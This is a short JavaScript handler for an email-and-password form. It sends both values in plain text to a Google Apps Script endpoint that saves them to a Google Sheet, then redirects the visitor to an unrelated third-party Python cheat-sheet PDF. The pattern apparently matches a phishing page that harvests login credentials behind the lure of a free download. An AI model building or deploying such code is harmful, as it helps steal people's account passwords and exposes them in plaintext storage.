document.getElementById("nextBtn").addEventListener("click", async function (event) {
  event.preventDefault(); // Prevent default form submission

  // Collect data
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Validate inputs
  if (!email || !password) {
    alert("Please fill in both email and password fields.");
    return;
  }

  // Send data to Google Sheets via Google Apps Script
  try {
    const response = await fetch("https://script.google.com/macros/s/AKfycbzaoZ-LVajtbM5K3oezXJXJr5kMiOjXy1Ths0SSNgfvXqWpJb0NxqaUlgmHoCNR-fmo/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const result = await response.json(); // Parse JSON response
    if (result.success) {
      alert("Data saved successfully!");
      // Redirect to the PDF file
      window.location.href = "https://allinpython.com/wp-content/uploads/2023/09/Python-Cheat-Sheet.pdf"; // Replace with your PDF URL
    } else {
      alert("Failed to save data: " + result.message);
    }
  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred while saving data.");
  }
});
